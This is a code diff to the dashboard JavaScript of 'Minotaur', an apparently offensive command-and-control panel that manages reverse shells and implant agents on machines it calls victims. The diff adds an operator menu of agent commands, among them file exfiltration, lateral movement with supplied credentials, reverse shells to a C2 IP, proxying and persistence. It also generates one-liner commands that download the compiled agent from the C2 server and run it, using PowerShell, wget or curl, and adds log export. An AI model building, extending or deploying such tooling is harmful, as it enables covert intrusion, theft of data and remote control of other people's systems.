@@ -1,4 +1,4 @@
-// Minotaur Dashboard – TCP shells + HTTP agents + activity logs + build agent + auto-persistence
+// Minotaur Dashboard – full version with absolute URLs in download commands
 const socket = io();
 
 let savedOutputs = {};
@@ -17,8 +17,8 @@ function escapeHtml(text) {
     });
 }
 
-// Helper: determine agent online status based on last beacon timestamp (threshold = 90 seconds)
-function getAgentStatus(lastBeaconIso, thresholdSeconds = 90) {
+// Agent online status (threshold = 30 seconds)
+function getAgentStatus(lastBeaconIso, thresholdSeconds = 180) {
     if (!lastBeaconIso) return { text: 'Unknown', color: 'gray' };
     const last = new Date(lastBeaconIso).getTime();
     const now = Date.now();
@@ -29,6 +29,12 @@ function getAgentStatus(lastBeaconIso, thresholdSeconds = 90) {
         return { text: 'Offline', color: 'red' };
     }
 }
+
+$('#refresh-agents-btn').click(() => {
+    loadAgents();
+    $('#agent-log').prepend('<div class="text-gray-400">→ Manual agent list refresh triggered.</div>');
+});
+
 
 // ==================== TAB SWITCHING ====================
 $('#tab-tcp').click(function() {
@@ -65,19 +71,20 @@ $('#tab-build').click(function() {
     $('#tcp-section').addClass('hidden');
     $('#agents-section').addClass('hidden');
     $('#logs-section').addClass('hidden');
+    loadAvailableAgents();  // refresh agent list
 });
 
 // Log subtabs
 $('#tab-shell-logs').click(function() {
-    $('#tab-shell-logs').addClass('border-blue-400 text-blue-400').removeClass('text-gray-400');
-    $('#tab-agent-logs').removeClass('border-blue-400 text-blue-400').addClass('text-gray-400');
+    $('#tab-shell-logs').removeClass('text-gray-400 border-transparent').addClass('text-blue-400 border-blue-400');
+    $('#tab-agent-logs').removeClass('text-blue-400 border-blue-400').addClass('text-gray-400 border-transparent');
     $('#shell-logs-panel').removeClass('hidden');
     $('#agent-logs-panel').addClass('hidden');
     loadShellLogs();
 });
 $('#tab-agent-logs').click(function() {
-    $('#tab-agent-logs').addClass('border-blue-400 text-blue-400').removeClass('text-gray-400');
-    $('#tab-shell-logs').removeClass('border-blue-400 text-blue-400').addClass('text-gray-400');
+    $('#tab-agent-logs').removeClass('text-gray-400 border-transparent').addClass('text-blue-400 border-blue-400');
+    $('#tab-shell-logs').removeClass('text-blue-400 border-blue-400').addClass('text-gray-400 border-transparent');
     $('#agent-logs-panel').removeClass('hidden');
     $('#shell-logs-panel').addClass('hidden');
     loadAgentLogs();
@@ -212,7 +219,7 @@ function loadAgents() {
             agents.forEach(a => {
                 const shortId = a.id.substring(0,8);
                 const lastBeacon = new Date(a.last_beacon).toLocaleString();
-                const status = getAgentStatus(a.last_beacon, 90);
+                const status = getAgentStatus(a.last_beacon, 30);
                 const statusHtml = `<span class="inline-block w-2 h-2 rounded-full mr-1" style="background-color: ${status.color};"></span>${status.text}`;
                 const row = $(`
                     <tr class="border-b border-gray-700 bg-gray-800/50 agent-row">
@@ -223,10 +230,7 @@ function loadAgents() {
                         <td class="px-4 py-2 text-xs">${lastBeacon}</td>
                         <td class="px-4 py-2 text-xs">${statusHtml}</td>
                         <td class="px-4 py-2">
-                            <button class="preset-agent-command bg-blue-600 hover:bg-blue-700 text-xs px-2 py-1 rounded" data-id="${a.id}">
-                                <i class="fas fa-cog"></i> Preset
-                            </button>
-                            <button class="shell-agent-btn bg-purple-600 hover:bg-purple-700 text-xs px-2 py-1 rounded ml-1" data-id="${a.id}">
+                            <button class="shell-agent-btn bg-purple-600 hover:bg-purple-700 text-xs px-2 py-1 rounded" data-id="${a.id}">
                                 <i class="fas fa-terminal"></i> Shell
                             </button>
                             <button class="delete-agent-btn bg-red-600 hover:bg-red-700 text-xs px-2 py-1 rounded ml-1" data-id="${a.id}">
@@ -240,40 +244,6 @@ function loadAgents() {
             });
         });
 }
-$(document).on('click', '.preset-agent-command', function() {
-    const agentId = $(this).data('id');
-    const cmdType = prompt("Command type (exec, exfil, lateral, persistence):", "exec");
-    if (!cmdType) return;
-    let payload = {};
-    if (cmdType === 'exec') {
-        const command = prompt("Enter command to execute:");
-        if (!command) return;
-        payload = {command: command};
-    } else if (cmdType === 'exfil') {
-        const filePath = prompt("Enter absolute file path to exfiltrate:");
-        if (!filePath) return;
-        payload = {path: filePath};
-    } else if (cmdType === 'lateral') {
-        const target = prompt("Target IP/hostname:");
-        const user = prompt("Username:");
-        const password = prompt("Password:");
-        const command = prompt("Command to run on target:");
-        if (!target || !user || !password || !command) return;
-        payload = {target: target, user: user, password: password, command: command};
-    } else if (cmdType === 'persistence') {
-        payload = {};
-    } else {
-        alert("Unknown type");
-        return;
-    }
-    fetch('/api/agent/send_command', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({agent_id: agentId, type: cmdType, payload: payload})
-    }).then(() => {
-        $('#agent-log').prepend(`<div class="text-green-400">→ ${cmdType} command queued for agent ${agentId.substring(0,8)}</div>`);
-    }).catch(err => console.error("Error sending preset command:", err));
-});
 $(document).on('click', '.delete-agent-btn', function() {
     const agentId = $(this).data('id');
     if (confirm(`Permanently delete agent ${agentId.substring(0,8)}? This will also attempt to remove it from the victim system.`)) {
@@ -312,25 +282,153 @@ $('#clear-all-agents-btn').click(function() {
         }).catch(err => console.error('Error clearing agents:', err));
     }
 });
+
+// Agent command selector & dynamic arguments (simplified)
+const commandArgs = {
+    exec: [{ name: "command", placeholder: "system command", type: "text" }],
+    sleep: [{ name: "seconds", placeholder: "seconds (e.g., 60)", type: "number" }],
+    cd: [{ name: "path", placeholder: "directory path", type: "text" }],
+    dir: [{ name: "path", placeholder: "directory path (optional)", type: "text", required: false }],
+    cat: [{ name: "filepath", placeholder: "file path", type: "text" }],
+    mkdir: [{ name: "path", placeholder: "directory path", type: "text" }],
+    remove: [{ name: "path", placeholder: "file or directory path", type: "text" }],
+    cp: [{ name: "src", placeholder: "source path", type: "text" }, { name: "dst", placeholder: "destination path", type: "text" }],
+    upload: [{ name: "path", placeholder: "destination path", type: "text" }, { name: "data", placeholder: "base64 encoded file data", type: "textarea" }],
+    download: [{ name: "path", placeholder: "file path to download", type: "text" }],
+    shell: [{ name: "command", placeholder: "command to execute", type: "text" }],
+    powershell: [{ name: "command", placeholder: "PowerShell command", type: "text" }],
+    lateral: [
+        { name: "target", placeholder: "target IP/hostname", type: "text" },
+        { name: "user", placeholder: "username", type: "text" },
+        { name: "password", placeholder: "password", type: "password" },
+        { name: "command", placeholder: "command to run", type: "text" }
+    ],
+    exfil: [{ name: "path", placeholder: "file path to exfiltrate", type: "text" }],
+    proxy: [{ name: "port", placeholder: "port to listen on", type: "number" }],
+    "shell-reverse": [{ name: "ip", placeholder: "C2 IP", type: "text" }, { name: "port", placeholder: "port", type: "number" }],
+    config: [{ name: "setting", placeholder: "setting name", type: "text" }, { name: "value", placeholder: "value", type: "text" }]
+};
+
+function updateCommandArgs() {
+    const cmdType = $('#agent-cmd-type').val();
+    const argsDiv = $('#agent-cmd-args');
+    argsDiv.empty();
+    
+    const args = commandArgs[cmdType] || [];
+    if (args.length === 0 && !['help', 'checkin', 'pwd', 'proc', 'net', 'persistence', 'delete'].includes(cmdType)) {
+        argsDiv.html('<div class="text-gray-400 text-sm">No additional arguments required</div>');
+        return;
+    }
+    
+    args.forEach(arg => {
+        if (arg.type === 'textarea') {
+            argsDiv.append(`
+                <div class="mb-2">
+                    <label class="block text-xs text-gray-400 mb-1">${arg.name}</label>
+                    <textarea id="cmd-arg-${arg.name}" class="w-full bg-gray-700 rounded px-3 py-2 text-sm" placeholder="${arg.placeholder}" rows="3"></textarea>
+                </div>
+            `);
+        } else {
+            argsDiv.append(`
+                <div class="mb-2">
+                    <label class="block text-xs text-gray-400 mb-1">${arg.name}</label>
+                    <input type="${arg.type}" id="cmd-arg-${arg.name}" class="w-full bg-gray-700 rounded px-3 py-2 text-sm" placeholder="${arg.placeholder}">
+                </div>
+            `);
+        }
+    });
+}
+
+$('#agent-cmd-type').change(updateCommandArgs);
+updateCommandArgs();
+
 $('#agent-exec-btn').click(() => {
     const agentId = $('#agent-select').val();
     if (!agentId) {
         alert("Please select an agent from the dropdown.");
         return;
     }
-    const command = $('#agent-command-input').val();
-    if (!command.trim()) return;
+    
+    const cmdType = $('#agent-cmd-type').val();
+    let payload = {};
+    
+    if (cmdType === 'exec') {
+        const command = $('#cmd-arg-command').val();
+        if (!command) { alert("Please enter a command"); return; }
+        payload = { command: command };
+    } else if (cmdType === 'sleep') {
+        const seconds = $('#cmd-arg-seconds').val();
+        if (!seconds) { alert("Please enter seconds"); return; }
+        payload = { seconds: seconds };
+    } else if (cmdType === 'cd' || cmdType === 'mkdir' || cmdType === 'remove') {
+        const path = $('#cmd-arg-path').val();
+        if (!path) { alert("Please enter a path"); return; }
+        payload = { path: path };
+    } else if (cmdType === 'dir') {
+        const path = $('#cmd-arg-path').val();
+        payload = { path: path || "" };
+    } else if (cmdType === 'cat') {
+        const filepath = $('#cmd-arg-filepath').val();
+        if (!filepath) { alert("Please enter a file path"); return; }
+        payload = { filepath: filepath };
+    } else if (cmdType === 'cp') {
+        const src = $('#cmd-arg-src').val();
+        const dst = $('#cmd-arg-dst').val();
+        if (!src || !dst) { alert("Please enter source and destination paths"); return; }
+        payload = { src: src, dst: dst };
+    } else if (cmdType === 'upload') {
+        const path = $('#cmd-arg-path').val();
+        const data = $('#cmd-arg-data').val();
+        if (!path || !data) { alert("Please enter destination path and base64 data"); return; }
+        payload = { path: path, data: data };
+    } else if (cmdType === 'download') {
+        const path = $('#cmd-arg-path').val();
+        if (!path) { alert("Please enter file path"); return; }
+        payload = { path: path };
+    } else if (cmdType === 'shell' || cmdType === 'powershell') {
+        const command = $('#cmd-arg-command').val();
+        if (!command) { alert("Please enter a command"); return; }
+        payload = { command: command };
+    } else if (cmdType === 'lateral') {
+        const target = $('#cmd-arg-target').val();
+        const user = $('#cmd-arg-user').val();
+        const password = $('#cmd-arg-password').val();
+        const command = $('#cmd-arg-command').val();
+        if (!target || !user || !password || !command) { alert("Please fill all lateral movement fields"); return; }
+        payload = { target: target, user: user, password: password, command: command };
+    } else if (cmdType === 'exfil') {
+        const path = $('#cmd-arg-path').val();
+        if (!path) { alert("Please enter file path to exfiltrate"); return; }
+        payload = { path: path };
+    } else if (cmdType === 'proxy') {
+        const port = $('#cmd-arg-port').val();
+        if (!port) { alert("Please enter port number"); return; }
+        payload = { port: port };
+    } else if (cmdType === 'shell-reverse') {
+        const ip = $('#cmd-arg-ip').val();
+        const port = $('#cmd-arg-port').val();
+        if (!ip || !port) { alert("Please enter IP and port"); return; }
+        payload = { ip: ip, port: port };
+    } else if (cmdType === 'config') {
+        const setting = $('#cmd-arg-setting').val();
+        const value = $('#cmd-arg-value').val();
+        if (!setting) { alert("Please enter setting name"); return; }
+        payload = { setting: setting, value: value || "" };
+    } else if (['persistence', 'delete', 'help', 'checkin', 'pwd', 'proc', 'net'].includes(cmdType)) {
+        payload = {};
+    } else {
+        alert("Unknown command type");
+        return;
+    }
+    
     fetch('/api/agent/send_command', {
         method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({
-            agent_id: agentId,
-            type: 'exec',
-            payload: {command: command}
-        })
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ agent_id: agentId, type: cmdType, payload: payload })
     }).then(() => {
-        $('#agent-log').prepend(`<div class="text-blue-400">→ Command "${command}" sent to agent ${agentId.substring(0,8)}</div>`);
+        $('#agent-log').prepend(`<div class="text-blue-400">→ ${cmdType} command sent to agent ${agentId.substring(0,8)}</div>`);
         $('#agent-command-input').val('');
+        updateCommandArgs();
     }).catch(err => console.error("Error sending command:", err));
 });
 
@@ -474,6 +572,30 @@ $('#open-range-btn').click(() => {
 });
 
 // ==================== ACTIVITY LOGS ====================
+function populateVictimFilter() {
+    fetch('/api/logs/victims')
+        .then(res => res.json())
+        .then(victimIds => {
+            const select = $('#shell-log-filter');
+            select.empty().append('<option value="">-- All victims --</option>');
+            victimIds.forEach(id => {
+                select.append(`<option value="${id}">${id.substring(0,8)}</option>`);
+            });
+            loadShellLogs();
+        });
+}
+function populateAgentFilter() {
+    fetch('/api/logs/agents')
+        .then(res => res.json())
+        .then(agentIds => {
+            const select = $('#agent-log-filter');
+            select.empty().append('<option value="">-- All agents --</option>');
+            agentIds.forEach(id => {
+                select.append(`<option value="${id}">${id.substring(0,8)}</option>`);
+            });
+            loadAgentLogs();
+        });
+}
 function loadShellLogs() {
     const victimId = $('#shell-log-filter').val();
     let url = '/api/activity/shell?limit=200';
@@ -504,10 +626,10 @@ function loadAgentLogs() {
             const sent = new Date(log.sent_at).toLocaleString();
             const completed = log.completed_at ? new Date(log.completed_at).toLocaleString() : 'pending';
             container.append(`
-                <div class="border-b border-gray-700 mb-2 pb-2">
-                    <div class="text-yellow-400">[${sent}] Agent ${log.agent_id.substring(0,8)} | Type: ${log.type}</div>
-                    <div class="text-gray-400 ml-4">Payload: ${log.payload}</div>
-                    <div class="text-green-400 ml-4">Result: ${log.output || log.error || '(no result)'}</div>
+                <div class="border-b border-dashed border-gray-600 mb-3 pb-3">
+                    <div class="text-yellow-400 font-mono">[${sent}] Agent ${log.agent_id.substring(0,8)} | Type: ${log.type}</div>
+                    <div class="text-gray-400 ml-4 text-xs">Payload: ${escapeHtml(log.payload)}</div>
+                    <div class="text-green-400 ml-4 whitespace-pre-wrap font-mono text-xs">Result: ${escapeHtml(log.output || log.error || '(no result)')}</div>
                     <div class="text-gray-500 text-xs ml-4">Completed: ${completed}</div>
                 </div>
             `);
@@ -516,8 +638,20 @@ function loadAgentLogs() {
 }
 $('#refresh-shell-logs').click(loadShellLogs);
 $('#refresh-agent-logs').click(loadAgentLogs);
+$('#download-shell-logs').click(() => {
+    const filterId = $('#shell-log-filter').val();
+    let url = '/api/export/logs?type=shell';
+    if (filterId) url += '&id=' + filterId;
+    window.location.href = url;
+});
+$('#download-agent-logs').click(() => {
+    const filterId = $('#agent-log-filter').val();
+    let url = '/api/export/logs?type=agent';
+    if (filterId) url += '&id=' + filterId;
+    window.location.href = url;
+});
 
-// ==================== BUILD AGENT ====================
+// ==================== BUILD & DEPLOY AGENT ====================
 $('#build-agent-btn').click(function() {
     const buildBtn = $(this);
     const statusDiv = $('#build-status');
@@ -541,31 +675,92 @@ $('#build-agent-btn').click(function() {
         body: JSON.stringify(data)
     })
     .then(response => {
-        if (!response.ok) return response.json().then(err => { throw err; });
-        return response.blob();
+        if (!response.ok) {
+            // Try to parse as JSON, otherwise throw an error with status text
+            return response.text().then(text => {
+                try {
+                    const err = JSON.parse(text);
+                    throw new Error(err.error || `Server error: ${response.status}`);
+                } catch (e) {
+                    throw new Error(`Server error ${response.status}: ${text.substring(0, 100)}`);
+                }
+            });
+        }
+        return response.json();
     })
-    .then(blob => {
-        const url = window.URL.createObjectURL(blob);
-        const a = document.createElement('a');
-        a.href = url;
-        let filename = `minotaur_agent_${data.goos}_${data.goarch}`;
-        if (data.goos === 'windows') filename += '.exe';
-        a.download = filename;
-        document.body.appendChild(a);
-        a.click();
-        a.remove();
-        window.URL.revokeObjectURL(url);
-        statusDiv.html('<div class="text-green-400">✅ Build successful! Download started.</div>');
+    .then(data => {
+        if (data.error) throw new Error(data.error);
+        statusDiv.html('<div class="text-green-400">✅ Build successful! Agent saved to server.</div>');
+        loadAvailableAgents();  // refresh the list of hosted agents
     })
     .catch(err => {
         console.error(err);
-        statusDiv.html(`<div class="text-red-400">❌ Build failed: ${err.error || err.message || 'Unknown error'}</div>`);
+        statusDiv.html(`<div class="text-red-400">❌ Build failed: ${err.message}</div>`);
     })
     .finally(() => {
         buildBtn.prop('disabled', false);
         setTimeout(() => statusDiv.addClass('hidden'), 8000);
     });
 });
+
+function loadAvailableAgents() {
+    fetch('/api/agents/list')
+        .then(res => res.json())
+        .then(agents => {
+            const container = $('#available-agents-list');
+            container.empty();
+            if (agents.length === 0) {
+                container.html('<div class="text-gray-500">No agents compiled yet. Use the form above to build one.</div>');
+                return;
+            }
+            const baseUrl = window.location.origin;  // e.g., http://192.168.2.133:5000
+            agents.forEach(agent => {
+                const agentName = agent.filename;
+                const relativeUrl = agent.url;
+                const fullUrl = baseUrl + relativeUrl;  // absolute URL
+                let downloadCmd = '';
+                let alternativeCmd = '';
+                let osLabel = '';
+
+                if (agentName.includes('windows')) {
+                    osLabel = 'Windows';
+                    downloadCmd = `powershell -c "Invoke-WebRequest -Uri '${fullUrl}' -OutFile $env:temp\\agent.exe; Start-Process $env:temp\\agent.exe"`;
+                    alternativeCmd = `curl -L -o agent.exe ${fullUrl} && agent.exe (requires curl)`;
+                } else if (agentName.includes('linux')) {
+                    osLabel = 'Linux';
+                    downloadCmd = `wget -O minotaur_agent ${fullUrl} && chmod +x minotaur_agent && ./minotaur_agent`;
+                    alternativeCmd = `curl -L -o minotaur_agent ${fullUrl} && chmod +x minotaur_agent && ./minotaur_agent`;
+                } else if (agentName.includes('darwin')) {
+                    osLabel = 'macOS';
+                    downloadCmd = `curl -L -o minotaur_agent ${fullUrl} && chmod +x minotaur_agent && ./minotaur_agent`;
+                    alternativeCmd = `wget -O minotaur_agent ${fullUrl} && chmod +x minotaur_agent && ./minotaur_agent`;
+                } else {
+                    osLabel = 'Unknown';
+                    downloadCmd = `curl -L -o minotaur_agent ${fullUrl} && chmod +x minotaur_agent && ./minotaur_agent`;
+                    alternativeCmd = '';
+                }
+
+                const card = $(`
+                    <div class="bg-gray-900 rounded-lg p-3">
+                        <div class="flex justify-between items-start">
+                            <div>
+                                <div class="font-mono text-sm">${agentName} (${osLabel})</div>
+                                <div class="text-gray-400 text-xs">Size: ${(agent.size/1024).toFixed(1)} KB | Last built: ${new Date(agent.modified).toLocaleString()}</div>
+                            </div>
+                            <a href="${fullUrl}" class="bg-blue-600 px-3 py-1 rounded text-sm hover:bg-blue-700">Download</a>
+                        </div>
+                        <div class="mt-2">
+                            <label class="text-xs text-gray-400">One‑liner download & execute:</label>
+                            <pre class="bg-black text-green-400 text-xs p-2 rounded mt-1 overflow-x-auto"><code class="break-all">${downloadCmd}</code></pre>
+                            ${alternativeCmd ? `<label class="text-xs text-gray-400 mt-2 block">Alternative (if wget/curl not available):</label>
+                            <pre class="bg-black text-green-400 text-xs p-2 rounded mt-1 overflow-x-auto"><code class="break-all">${alternativeCmd}</code></pre>` : ''}
+                        </div>
+                    </div>
+                `);
+                container.append(card);
+            });
+        });
+}
 
 // ==================== SOCKET.IO REAL-TIME ====================
 socket.on('new_victim', () => loadVictims());
@@ -610,6 +805,9 @@ socket.on('agents_cleared', () => {
 loadVictims();
 loadPortEvents();
 loadActivePorts();
+populateVictimFilter();
+populateAgentFilter();
+loadAvailableAgents();
 setInterval(() => {
     loadVictims();
     loadActivePorts();
